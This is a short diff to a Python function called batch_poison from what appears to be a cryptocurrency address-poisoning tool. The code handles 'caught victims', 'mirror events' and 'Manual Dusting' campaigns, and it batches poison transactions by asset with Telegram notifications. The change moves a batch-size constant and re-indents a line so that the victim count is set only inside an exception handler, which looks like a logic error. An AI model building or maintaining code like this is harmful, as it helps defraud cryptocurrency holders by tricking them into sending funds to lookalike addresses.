@@ -1204,11 +1204,14 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
         except Exception as e:
             logger.warning(f"Could not read caught victims file: {e}")
 
-    total = len(entries)
+        total = len(entries)
     logger.info(f"Found {total} victims. Processing with mirror events only...")
     if job_id:
         update_job(job_id, total=total)
         
+    # 🚀 BATCH PROCESSING: Group by asset so we don't mix USDC and ETH in the same batch
+    BATCH_SIZE = 10  
+    
     # 🚀 Send "Started" Telegram notification immediately
     start_msg = (
         f"🚀 *Manual Dusting Started*\n\n"
@@ -1219,9 +1222,6 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
 
     success = 0
     gas_failures = 0
-    
-    # 🚀 BATCH PROCESSING: Group by asset so we don't mix USDC and ETH in the same batch
-    BATCH_SIZE = 10  
     poison_queues = {}  # asset -> list of queue items
     
     for i, entry in enumerate(entries, 1):
